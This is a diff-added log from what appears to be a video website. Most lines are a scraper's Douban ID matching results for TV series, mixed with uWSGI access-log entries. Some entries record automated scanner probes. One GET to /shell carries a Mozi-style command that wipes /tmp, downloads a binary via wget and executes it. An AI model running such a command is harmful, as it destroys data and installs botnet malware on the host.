+这里的黎明静悄悄 2248579 保存成功[douban]
+牡丹与玫瑰 1961872 保存成功[douban]
+超人前传第四季 3142797 保存成功[douban]
+犯罪现场调查第五季 2375059 保存成功[douban]
+好想好想谈恋爱 2263277 保存成功[douban]
+连城诀 2249544 保存成功[douban]
+魂断楼兰 3175456 保存成功[douban]
+京城四少 3778478 保存成功[douban]
+警界传奇 26663714 保存成功[douban]
+24小时第三季 2376728 保存成功[douban]
+俗世情真 3035712 保存成功[douban]
+征服 1917796 保存成功[douban]
+无怨无悔 6079086 保存成功[douban]
+马尔科姆的一家第五季 23701386 保存成功[douban]
+新四军 4886290 7.1保存成功[douban]
+再见爱人 3330208 保存成功[douban]
+倚天钦差 6077971 保存成功[douban]
+法理人生 26296231 保存成功[douban]
+铁警神犬 26358630 保存成功[douban]
+誓言无声 2156655 保存成功[douban]
+党员马大姐 3605467 保存成功[douban]
+北条时宗 1904803 保存成功[douban]
+黑道家族第三季 2154323 保存成功[douban]
+[pid: 10432|app: 0|req: 141/188] 101.89.239.245 () {36 vars in 601 bytes} [Fri Jun 12 12:22:00 2020] GET /novel => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 145 bytes (1 switches on core 0)
+策马啸西风 3055383 保存成功[douban]
+还我激情 2301551 保存成功[douban]
+相约青春 2398704 保存成功[douban]
+康熙王朝 1830590 保存成功[douban]
+同志亦凡人第一季 1427500 保存成功[douban]
+太平天国 2156648 6.6保存成功[douban]
+乱世飘萍 3074727 保存成功[douban]
+白色陷阱 2330075 保存成功[douban]
+proxy: 58.220.95.114:10053 Status Code： 403 重试
+是，大臣第一季 4937405 保存成功[douban]
+恐龙特急克塞号 1872374 保存成功[douban]
+霹雳娇娃第二季 30372740 保存成功[douban]
+神奇女侠 第一季 2003096 保存成功[douban]
+————————豆瓣id获取完毕————————
+[pid: 10432|app: 0|req: 141/189] 113.69.35.228 () {44 vars in 922 bytes} [Fri Jun 12 07:58:15 2020] GET /admin/get_rating/ => generated 4 bytes in 17442351 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 142/190] 103.27.25.148 () {42 vars in 1439 bytes} [Fri Jun 12 12:57:15 2020] GET /video/?nsukey=6P9EJ6xRi7CBvRcBp%2FkZR4fjgRzlqhXSgQC70yutzBGvwuoslVVgFsCDR1FhC7C3aqkuYLsyFQafeZqfVU3K4%2FsRcx7kDlmdd7mdhHnAPcQM7JaKU1v9sTDQ7N4Bqql8rXKwvH1LnThYyC4cTPE2Tv2Ez9JOfzBj%2BvNhLwjl8jsvjLd06mUjAvv4HZkBiepAjhtNVxLG34ECQPuCN%2BnATA%3D%3D => generated 59292 bytes in 400 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 143/191] 103.27.25.148 () {44 vars in 1079 bytes} [Fri Jun 12 12:59:14 2020] GET /video/play/87747/ => generated 13929 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 144/192] 103.27.25.148 () {44 vars in 1542 bytes} [Fri Jun 12 12:59:15 2020] GET /video/play/87747/?nsukey=y36V37Ax5Ku5wQAQYS5moH7v0coHloBcAAhao88wqleqQywXezf8vcAN4QlrmRDxgfBtufHyz2AJmJVMS2ujbKAp4vEc8ohYHCcF1pE%2FeivYL4PzMLlgk1EzzLT4FXghZgsCxA9vAJ2Ga6yrqV226FDlB2TBsH1JejGKYNImorPHU8M8xoid4KtymDbAMBxd%2FxMna2cCapWOp5XxVfp7tA%3D%3D => generated 13929 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 145/193] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 13:20:50 2020] GET /admin/view_log/?page=4 => generated 21791 bytes in 13 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 146/194] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 13:20:54 2020] GET /admin/view_log/?page=5 => generated 21866 bytes in 12 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 147/195] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 13:21:11 2020] GET /admin/view_log/?page=6 => generated 18160 bytes in 13 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 148/196] 112.96.199.149 () {44 vars in 930 bytes} [Fri Jun 12 13:21:16 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+————————开始获取豆瓣id数据————————
+无豆瓣id的视频总数：5243
+无匹配视频总数：2430
+重复数据的视频总数：593
+[pid: 10432|app: 0|req: 149/197] 112.96.199.149 () {44 vars in 932 bytes} [Fri Jun 12 13:21:22 2020] GET /admin/view_log/ => generated 21689 bytes in 12 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 27/198] 112.96.199.149 () {44 vars in 954 bytes} [Fri Jun 12 13:21:25 2020] GET /admin/view_log/?page=6 => generated 18477 bytes in 13 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 28/199] 117.136.30.213 () {42 vars in 1450 bytes} [Fri Jun 12 13:24:02 2020] GET /video/?nsukey=1SNemnkaPFP0G6s5sT6bBuUUl7%2Fl9sOBMcE6KE%2FfAY1QGE%2ByndipNf7Q7RptbyLbQFDbhEp8qSl3EhGy4RPJyOR2pc5mwUR3Ew3hPUT7kNmni6Z07vN8nqZ1Axi9quGgU666wM1RO7OhSYGgPwwsr%2B9i7DZD3s8k3171n2UIEoZahRMXsqpKkjDOSTa6F1PlKmIc%2FHy%2FwpFYFdME4Cu0ww%3D%3D => generated 59292 bytes in 410 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+发展受阻第五季 26363230 保存成功[douban]
+制造快乐：Funko的故事 30234167 保存成功[douban]
+幸福的脚步 30370766 保存成功[douban]
+七黄五狼黑之神机秘策 26937553 保存成功[douban]
+同窗那些事儿 27040764 保存成功[douban]
+[pid: 10430|app: 0|req: 29/200] 103.27.25.148 () {44 vars in 1528 bytes} [Fri Jun 12 13:50:46 2020] GET /video/?nsukey=6P9EJ6xRi7CBvRcBp%2FkZR4fjgRzlqhXSgQC70yutzBGvwuoslVVgFsCDR1FhC7C3aqkuYLsyFQafeZqfVU3K4%2FsRcx7kDlmdd7mdhHnAPcQM7JaKU1v9sTDQ7N4Bqql8rXKwvH1LnThYyC4cTPE2Tv2Ez9JOfzBj%2BvNhLwjl8jsvjLd06mUjAvv4HZkBiepAjhtNVxLG34ECQPuCN%2BnATA%3D%3D => generated 59292 bytes in 410 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 30/201] 162.243.144.96 () {34 vars in 394 bytes} [Fri Jun 12 14:01:23 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+低俗怪谈第三季 26426055 保存成功[douban]
+终极蜘蛛侠第四季 26718765 保存成功[douban]
+我是红军 26879731 保存成功[douban]
+终极使命 26383473 保存成功[douban]
+休斯顿，我们有麻烦了！ 26807605 保存成功[douban]
+[pid: 10430|app: 0|req: 31/202] 195.54.160.135 () {38 vars in 610 bytes} [Fri Jun 12 14:15:35 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+天涯女人心 25926751 保存成功[douban]
+热血街区 26589929 保存成功[douban]
+无间双龙：这份爱，才是正义 25953663 保存成功[douban]
+异空漫游第一季 26357656 保存成功[douban]
+零之真实：监察医松本真央 25897282 保存成功[douban]
+MTV音乐电视大奖 25967485 保存成功[douban]
+危险旅程 25938819 保存成功[douban]
+深宅1927 25798177 保存成功[douban]
+光影 26279432 保存成功[douban]
+同窗生：人生谈三次恋爱 25894318 保存成功[douban]
+特效化妆师大对决第二季 10446304 保存成功[douban]
+魂归故里第一季 20435079 保存成功[douban]
+海帆第三季 25950547 保存成功[douban]
+辛普森一家第二十四季 11531759 保存成功[douban]
+孤独的美食家第一季 7065168 保存成功[douban]
+有钱男与贫穷女 10756863 保存成功[douban]
+下一站歌后第一季 4097412 保存成功[douban]
+养女 10514842 保存成功[douban]
+青春密语第五季 10795743 保存成功[douban]
+[pid: 10430|app: 0|req: 32/203] 49.235.118.98 () {34 vars in 500 bytes} [Fri Jun 12 14:26:17 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 16/204] 49.235.118.98 () {34 vars in 486 bytes} [Fri Jun 12 14:26:17 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 17/205] 49.235.118.98 () {34 vars in 522 bytes} [Fri Jun 12 14:26:17 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 150/206] 49.235.118.98 () {34 vars in 504 bytes} [Fri Jun 12 14:26:17 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 9/207] 49.235.118.98 () {34 vars in 494 bytes} [Fri Jun 12 14:26:17 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 10/208] 49.235.118.98 () {34 vars in 510 bytes} [Fri Jun 12 14:26:17 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 151/209] 49.235.118.98 () {34 vars in 482 bytes} [Fri Jun 12 14:26:17 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10431|app: 0|req: 11/210] 49.235.118.98 () {34 vars in 480 bytes} [Fri Jun 12 14:26:17 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 18/211] 49.235.118.98 () {34 vars in 465 bytes} [Fri Jun 12 14:26:17 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+proxy: 221.122.91.34:80 Status Code： 403 重试
+————————豆瓣id获取完毕————————
+[pid: 10430|app: 0|req: 32/212] 112.96.199.149 () {44 vars in 923 bytes} [Fri Jun 12 13:21:18 2020] GET /admin/get_rating/ => generated 4 bytes in 5094726 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 33/213] 139.162.106.181 () {32 vars in 401 bytes} [Fri Jun 12 15:11:23 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 152/214] 95.65.120.165 () {32 vars in 463 bytes} [Fri Jun 12 16:16:41 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 153/215] 14.24.26.101 () {42 vars in 796 bytes} [Fri Jun 12 16:23:14 2020] GET /novel/ => generated 6151 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 154/216] 106.11.222.110 () {42 vars in 861 bytes} [Fri Jun 12 16:23:15 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 34/217] 14.24.26.101 () {42 vars in 768 bytes} [Fri Jun 12 16:23:15 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 35/218] 14.24.26.101 () {42 vars in 768 bytes} [Fri Jun 12 16:23:15 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 155/219] 125.64.94.132 () {28 vars in 307 bytes} [Fri Jun 12 16:35:14 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 156/220] 183.230.30.249 () {34 vars in 556 bytes} [Fri Jun 12 17:09:18 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 157/221] 45.9.148.91 () {36 vars in 436 bytes} [Fri Jun 12 17:57:44 2020] GET /WSMAN => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 158/222] 121.231.49.131 () {34 vars in 643 bytes} [Fri Jun 12 19:29:01 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 159/223] 129.204.238.101 () {34 vars in 502 bytes} [Fri Jun 12 19:36:11 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 160/224] 129.204.238.101 () {34 vars in 488 bytes} [Fri Jun 12 19:36:11 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 12/225] 129.204.238.101 () {34 vars in 524 bytes} [Fri Jun 12 19:36:11 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 13/226] 129.204.238.101 () {34 vars in 506 bytes} [Fri Jun 12 19:36:11 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 19/227] 129.204.238.101 () {34 vars in 496 bytes} [Fri Jun 12 19:36:11 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 20/228] 129.204.238.101 () {34 vars in 512 bytes} [Fri Jun 12 19:36:11 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 161/229] 129.204.238.101 () {34 vars in 484 bytes} [Fri Jun 12 19:36:12 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 36/230] 129.204.238.101 () {34 vars in 482 bytes} [Fri Jun 12 19:36:12 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 37/231] 129.204.238.101 () {34 vars in 467 bytes} [Fri Jun 12 19:36:12 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 38/232] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 19:50:12 2020] GET /admin/view_log/?page=6 => generated 20836 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 162/233] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 19:50:16 2020] GET /admin/view_log/?page=6 => generated 20892 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 163/234] 112.96.199.149 () {44 vars in 930 bytes} [Fri Jun 12 19:50:27 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+————————开始获取豆瓣id数据————————
+无豆瓣id的视频总数：5215
+无匹配视频总数：2430
+重复数据的视频总数：593
+[pid: 10432|app: 0|req: 165/235] 112.96.199.149 () {44 vars in 932 bytes} [Fri Jun 12 19:50:34 2020] GET /admin/view_log/ => generated 21689 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 166/236] 112.96.199.149 () {44 vars in 954 bytes} [Fri Jun 12 19:50:39 2020] GET /admin/view_log/?page=6 => generated 21209 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 167/237] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 19:50:52 2020] GET /admin/view_log/?page=6 => generated 21265 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+最美的乡村 34463479 保存成功[douban]
+[pid: 10432|app: 0|req: 168/238] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 19:51:18 2020] GET /admin/view_log/?page=6 => generated 21367 bytes in 14 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+拉米第二季 34700420 保存成功[douban]
+[pid: 10432|app: 0|req: 169/239] 112.96.199.149 () {42 vars in 885 bytes} [Fri Jun 12 19:51:43 2020] GET /video/type/1/ => generated 34117 bytes in 245 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 39/240] 112.96.199.149 () {44 vars in 935 bytes} [Fri Jun 12 19:51:46 2020] GET /video/type/2/ => generated 38179 bytes in 177 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+有村架纯的摄休 34906698 保存成功[douban]
+小姐姐不是你想的那样 34972300 保存成功[douban]
+再见妈妈 34858567 保存成功[douban]
+天堂岛疑云第九季 34931458 保存成功[douban]
+在深灰色的箱子中 34906758 保存成功[douban]
+2040 30428893 保存成功[douban]
+脏雪第一季 34884038 保存成功[douban]
+呼叫助产士第八季 30419876 保存成功[douban]
+幻想快乐第二季 30134200 保存成功[douban]
+德雷尔一家第四季 30234228 保存成功[douban]
+因法之名 26951639 保存成功[douban]
+为何那样，奉尚先生 30362302 保存成功[douban]
+粉雄救兵第三季 30272423 保存成功[douban]
+罗曼史是别册附录 30327718 保存成功[douban]
+小哥哥怕是有毒吧 33441940 保存成功[douban]
+大厨秀第二季 34833192 8.3保存成功[douban]
+外星生命第一季 30206536 保存成功[douban]
+迷线 26910037 保存成功[douban]
+鲁邦的女儿 33441921 保存成功[douban]
+我是班主任 33444365 保存成功[douban]
+蜀汉酒楼 34863322 保存成功[douban]
+公子哥少年 32582016 保存成功[douban]
+三人沉浮 30372458 保存成功[douban]
+黄金庭院 33447421 保存成功[douban]
+罪有可辩第一季 30226522 保存成功[douban]
+掩不住的阳光 21327514 保存成功[douban]
+白狐的人生 26928355 保存成功[douban]
+看见味道的你 30372842 保存成功[douban]
+竹马钢琴师 30279967 保存成功[douban]
+亲爱的战士 30401315 保存成功[douban]
+圣诞寻伴第一季 33376599 保存成功[douban]
+抓住幽灵 30474633 保存成功[douban]
+初来乍到第六季 33442710 保存成功[douban]
+心灵法医 30329153 保存成功[douban]
+蝶之力学杀人分析班 34800600 6.8保存成功[douban]
+隔壁的兄弟很和睦 33447806 保存成功[douban]
+我们的留学日志 34930786 保存成功[douban]
+新手姐妹的双人餐桌 34808402 保存成功[douban]
+不知东方既白 30444931 保存成功[douban]
+鹤唳华亭 27114834 保存成功[douban]
+二战重大事件第一季 34885942 保存成功[douban]
+网红的疯狂世界 34812453 保存成功[douban]
+法律之心：重建生命的律师 33449765 保存成功[douban]
+清道夫第七季 30409507 保存成功[douban]
+我们都要好好的 27149558 5.2保存成功[douban]
+传奇王子2：贵族诞生 34905655 4.7保存成功[douban]
+四神守护者 34938166 保存成功[douban]
+月咒魅影 33719612 保存成功[douban]
+权欲第六季 30170214 保存成功[douban]
+上帝加我好友第二季 34807030 保存成功[douban]
+威尔和格蕾丝第十一季 30172846 保存成功[douban]
+芝加哥警署第七季 33716827 保存成功[douban]
+招摇 匹配到多个豆瓣id数据，存入列表2 ['27075195', '30379828']
+初来乍到第五季 30220017 保存成功[douban]
+罗马三贱客第四季 30192667 7.5保存成功[douban]
+新夏威夷神探第一季 30132494 保存成功[douban]
+生活大爆炸第十二季 27001001 保存成功[douban]
+海豹突击队第二季 30181083 保存成功[douban]
+致命武器第三季 30221885 保存成功[douban]
+你的孩子不是你的孩子 30232339 保存成功[douban]
+密查 30158969 保存成功[douban]
+潘多拉4：AI战争 30313957 保存成功[douban]
+喜欢你时风好甜 27663745 保存成功[douban]
+星火燎原之云雾街 27097859 保存成功[douban]
+缚爱之约第二季 29200862 保存成功[douban]
+一夜桃花运第一季 30373143 保存成功[douban]
+我的恶魔少爷 27124474 保存成功[douban]
+副本 第一季 25814668 保存成功[douban]
+阳关道 30175274 保存成功[douban]
+好女孩第一季 26932882 保存成功[douban]
+零一获千金游戏 30217014 保存成功[douban]
+火王之破晓之战 26901432 保存成功[douban]
+必由之路 30395127 保存成功[douban]
+我的青春也灿烂 27124940 保存成功[douban]
+警视厅零系：生活安全科万能咨询室第三季 30246352 保存成功[douban]
+银魂2 匹配到多个豆瓣id数据，存入列表2 ['27199577', '30276505', '30176789']
+神秘博士第十一季 26713916 保存成功[douban]
+名校风暴第一季 27092429 保存成功[douban]
+皇甫神医 26163945 保存成功[douban]
+我们由奇迹构成 30291583 保存成功[douban]
+我们的四十年 匹配到多个豆瓣id数据，存入列表2 ['27172912', '30398888']
+天乩之白蛇传说 26956031 6.2保存成功[douban]
+人类清除计划第一季 27012995 保存成功[douban]
+野兽家族第三季 27621613 保存成功[douban]
+如若巴黎不快乐 26759909 保存成功[douban]
+为青春点赞 30361987 保存成功[douban]
+娘道 26877848 保存成功[douban]
+橙红年代 27036972 保存成功[douban]
+大明湖畔有人家 30291490 保存成功[douban]
+香蜜沉沉烬如霜 26920281 保存成功[douban]
+法医秦明2清道夫 26913955 保存成功[douban]
+海豹六队 第二季 26982787 保存成功[douban]
+女王进行时 30188056 保存成功[douban]
+想看你微笑 27203019 保存成功[douban]
+眼镜蛇第一季 27188562 保存成功[douban]
+大君 匹配到多个豆瓣id数据，存入列表2 ['27180951', '26969115', '30284854', '30377035']
+处女情缘 第四季 26952098 保存成功[douban]
+星蝶公主 第三季  27080590 9.3保存成功[douban]
+暗网第二季 27058232 7.4保存成功[douban]
+上瘾 27056797 5.4保存成功[douban]
+生活大爆炒 27119496 保存成功[douban]
+疯狂前女友 第三季 26952100 保存成功[douban]
+相对宇宙 第一季 26474254 8.5保存成功[douban]
+狐狸的夏天第二季 34991585 保存成功[douban]
+爆笑女警 第三季 26840171 保存成功[douban]
+河谷镇 第一季 26720476 保存成功[douban]
+酱汁小姐之恋 26994746 保存成功[douban]
+阁楼恋人 27021705 保存成功[douban]
+日常茶饭爱 27069430 7.3保存成功[douban]
+思美人之山鬼后裔 27067936 保存成功[douban]
+爱情二三事第二季 26353773 保存成功[douban]
+富滇风云 6861567 保存成功[douban]
+儿科医生 26926323 5.3保存成功[douban]
+孽海情深 26575842 保存成功[douban]
+穿越时光的糖果师 27109506 保存成功[douban]
+一剑横空 26974604 保存成功[douban]
+琅琊榜之风起长林 26665065 保存成功[douban]
+三生三世十里桃花 匹配到多个豆瓣id数据，存入列表2 ['25823277', '25975243']
+卧虎 匹配到多个豆瓣id数据，存入列表2 ['21327512', '26874501']
+深爱食堂第二季 26915562 保存成功[douban]
+聶小倩 匹配到多个豆瓣id数据，存入列表2 ['26711707', '26904171']
+薛定谔的猫 匹配到多个豆瓣id数据，存入列表2 ['26861028', '26754983']
+王室第三季 26911586 保存成功[douban]
+牧师神探第二季 26271090 保存成功[douban]
+摩斯探长前传第三季 25873036 保存成功[douban]
+出柜家庭第二季 26792787 保存成功[douban]
+初来乍到第三季 26740384 保存成功[douban]
+博斯第二季 26356537 保存成功[douban]
+护宝风云 26929195 保存成功[douban]
+伦敦生活第一季 26838164 保存成功[douban]
+最错决定第三季 26688088 7.7保存成功[douban]
+金装律师第六季 26436601 保存成功[douban]
+最好的遇见 25949985 保存成功[douban]
+邪恶力量第十二季 26746532 保存成功[douban]
+卖房子的女人 26720117 保存成功[douban]
+画江湖之不良人2 26930554 5.9保存成功[douban]
+幸福起航 26274138 4.7保存成功[douban]
+不愉快的果实 26738055 6.4保存成功[douban]
+鬼玩人 第二季 26654029 保存成功[douban]
+血族 第三季 26389455 保存成功[douban]
+园子温这种生物 26728557 7.4保存成功[douban]
+待嫁十年 24381554 保存成功[douban]
+象牙的游戏 26857693 9.0保存成功[douban]
+洪水泛滥之前 26857715 保存成功[douban]
+生活有点甜 26796680 保存成功[douban]
+CODE浮士德游戏 26732382 保存成功[douban]
+镖王传奇 26613383 保存成功[douban]
+忍冬艳蔷薇 26425609 保存成功[douban]
+云水怒 26646179 保存成功[douban]
+我为儿孙当北漂 25951753 保存成功[douban]
+渔岛怒潮 25984021 保存成功[douban]
+婚姻攻防战之爱要付出 26582608 保存成功[douban]
+大面曹天 26667334 保存成功[douban]
+港媳嫁到 25862362 保存成功[douban]
+走进看守所 20388210 保存成功[douban]
+印度之夏第一季 26327337 7.9保存成功[douban]
+王室第一季 25874860 保存成功[douban]
+衰姐们第四季 25810831 8.6保存成功[douban]
+杀寇决 25837707 保存成功[douban]
+戏里戏外第三季 19935729 8.7保存成功[douban]
+欢迎来到瑞典第一季 25745577 保存成功[douban]
+隐世狼女第一季 25790385 保存成功[douban]
+proxy: 153.35.185.71:18000 Status Code： 403 重试
+proxy: 58.220.95.115:80 Status Code： 403 重试
+proxy: 221.122.91.34:80 Status Code： 403 重试
+————————豆瓣id获取完毕————————
+[pid: 10432|app: 0|req: 169/241] 112.96.199.149 () {44 vars in 923 bytes} [Fri Jun 12 19:50:28 2020] GET /admin/get_rating/ => generated 4 bytes in 7216991 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 170/242] 113.69.35.100 () {46 vars in 1028 bytes} [Fri Jun 12 22:13:45 2020] GET /video/search/?wd=%E5%A4%AA%E5%AD%90%E5%A6%83&page=1 => generated 15186 bytes in 53 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 40/243] 113.69.35.100 () {46 vars in 986 bytes} [Fri Jun 12 22:13:49 2020] GET /video/play/57067/ => generated 19319 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 171/244] 112.96.112.189 () {42 vars in 885 bytes} [Fri Jun 12 23:35:52 2020] GET /video/type/2/ => generated 38151 bytes in 200 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 172/245] 112.96.112.189 () {42 vars in 902 bytes} [Fri Jun 12 23:35:55 2020] GET /admin/view_log/?page=6 => generated 21828 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 173/246] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:36:08 2020] GET /admin/view_log/?page=7 => generated 21935 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 174/247] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:36:12 2020] GET /admin/view_log/?page=8 => generated 20111 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 175/248] 112.96.112.189 () {44 vars in 930 bytes} [Fri Jun 12 23:36:18 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+————————开始获取豆瓣id数据————————
+无豆瓣id的视频总数：5067
+无匹配视频总数：2430
+重复数据的视频总数：601
+[pid: 10432|app: 0|req: 177/249] 112.96.112.189 () {44 vars in 932 bytes} [Fri Jun 12 23:36:23 2020] GET /admin/view_log/ => generated 21756 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 41/250] 112.96.112.189 () {44 vars in 954 bytes} [Fri Jun 12 23:36:25 2020] GET /admin/view_log/?page=8 => generated 20428 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 42/251] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:36:30 2020] GET /admin/view_log/?page=7 => generated 21935 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 178/252] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:36:44 2020] GET /admin/view_log/?page=6 => generated 21828 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
